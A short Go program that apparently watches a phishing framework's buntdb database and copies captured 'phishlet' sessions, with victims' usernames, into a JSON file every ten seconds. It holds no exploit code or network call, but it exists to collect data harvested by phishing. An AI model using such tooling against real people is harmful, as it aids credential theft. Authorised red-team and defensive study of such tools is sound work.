package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"time"

	"github.com/tidwall/buntdb"
)

type Session struct {
	Id         int    `json:"id"`
	Phishlet   string `json:"phishlet"`
	Username   string `json:"username"`
	UpdateTime int64  `json:"update_time"`
}

const (
	dbFileName  = "data.db"
	jsonFileName = "sessions.json"
)

func main() {
	db, err := buntdb.Open(dbFileName)
	if err != nil {
		fmt.Println("Error opening database:", err)
		return
	}
	defer db.Close()

	// Initialize JSON file
	initializeJSONFile(jsonFileName)

	var lastUpdateTime int64

	// Graceful shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt)
	go func() {
		<-stop
		fmt.Println("Shutting down...")
		db.Close()
		os.Exit(0)
	}()

	for {
		var newSessions []*Session

		err := db.View(func(tx *buntdb.Tx) error {
			return tx.Ascend("sessions_id", func(key, val string) bool {
				var s Session
				if err := json.Unmarshal([]byte(val), &s); err != nil {
					fmt.Println("Error unmarshaling session:", err)
					return true // Skip invalid entry
				}
				if s.UpdateTime > lastUpdateTime {
					newSessions = append(newSessions, &s)
				}
				return true
			})
		})
		if err != nil {
			fmt.Println("Error reading from database:", err)
			continue
		}

		if len(newSessions) > 0 {
			if err := appendSessionsToJson(newSessions, jsonFileName); err != nil {
				fmt.Println("Error appending sessions:", err)
			}
			lastUpdateTime = newSessions[len(newSessions)-1].UpdateTime
		}

		time.Sleep(10 * time.Second)
	}
}

func initializeJSONFile(filename string) {
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		if err := os.WriteFile(filename, []byte("[]"), 0644); err != nil {
			fmt.Println("Error creating JSON file:", err)
		}
	}
}

func appendSessionsToJson(sessions []*Session, filename string) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	var allSessions []*Session
	if err := json.Unmarshal(data, &allSessions); err != nil {
		return err
	}

	allSessions = append(allSessions, sessions...)
	newData, err := json.MarshalIndent(allSessions, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(filename, newData, 0644)
}
